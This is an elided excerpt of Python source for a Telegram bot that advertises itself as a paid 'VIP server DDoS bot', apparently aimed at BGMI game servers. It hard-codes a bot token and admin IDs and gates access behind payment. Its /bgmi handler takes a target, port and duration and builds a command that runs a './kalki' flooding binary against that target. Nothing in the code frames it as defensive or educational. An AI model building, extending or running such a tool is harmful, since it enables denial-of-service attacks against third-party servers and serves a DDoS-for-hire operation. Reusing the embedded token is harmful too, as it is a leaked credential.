...
bot = telebot.TeleBot('7418515974:AAEUTzudf6YCG4hSYF8-2e5bUVJm2P9ktz8')

# Admin user IDs
admin_id = ["5564420192","7795055510"]
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "You have not purchased yet purchase now from:- ADMIN."
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of ADMIN Vvip Server"
    bot.reply_to(message, response)
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "Thodi Der Ruk Jaa Yaara❌. Please Wait 5 min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                full_command = f"./kalki {target} {port} {time} 512 800"
...
def welcome_start(message):
    ...
    response = f'''❄️ Welcome {user_name} to the VIP server DDoS bot. This is a high server-based DDoS tool. 
To get access, contact ADMIN or type /help.'''
    ...
    try:
        ...
        # Log the selected image URL to ensure it's being chosen correctly
        print(f"Selected image URL: {image_url}")
        
        # Send the random image using bot.send_photo
        bot.send_photo(message.chat.id, image_url)
        print(f"Image sent to chat {message.chat.id}")
    
    except Exception as e:
        print(f"Error occurred while sending the image: {e}")
        bot.send_message(message.chat.id, "Sorry, I couldn't send the image right now.")
